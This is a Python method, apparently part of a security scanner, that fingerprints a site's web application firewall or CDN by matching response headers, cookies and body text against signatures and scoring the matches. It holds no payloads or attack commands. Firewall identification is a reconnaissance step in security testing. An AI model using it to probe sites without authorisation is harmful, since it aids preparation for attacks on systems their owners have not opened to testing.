    def fingerprint(self, url: str, headers: Dict, body: str, cookies: Dict = None) -> Dict:
        """Fingerprint WAF/CDN from response"""
        results = {}
        cookies = cookies or {}
        
        headers_lower = {k.lower(): v for k, v in headers.items()}
        body_lower = body.lower()[:10000]
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            score = 0
            max_score = 0
            
            # Check headers
            for header_key, expected_value in signatures.get("headers", {}).items():
                max_score += 1
                actual_value = headers_lower.get(header_key.lower(), "")
                if expected_value is None and actual_value:
                    score += 1
                elif expected_value and re.search(expected_value, str(actual_value), re.I):
                    score += 1
            
            # Check cookies
            for cookie_key, expected_value in signatures.get("cookies", {}).items():
                max_score += 1
                for ck in cookies:
                    if re.search(cookie_key, ck, re.I):
                        if expected_value is None or re.search(expected_value, str(cookies.get(ck, "")), re.I):
                            score += 1
                            break
            
            # Check body patterns
            for pattern in signatures.get("body_patterns", []):
                max_score += 1
                if re.search(pattern, body_lower, re.I):
                    score += 1
            
            if max_score > 0:
                confidence = (score / max_score) * 100
                if confidence >= 30:
                    results[waf_name] = confidence
        
        # Sort by confidence
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        
        if sorted_results:
            self.detected_wafs = [name for name, _ in sorted_results[:3]]
            self.confidence_scores = dict(sorted_results[:3])
            
            return {
                "detected": True,
                "primary": sorted_results[0][0],
                "confidence": sorted_results[0][1],
                "all_matches": dict(sorted_results[:3])
            }
        
        return {"detected": False, "primary": None, "confidence": 0, "all_matches": {}}
    
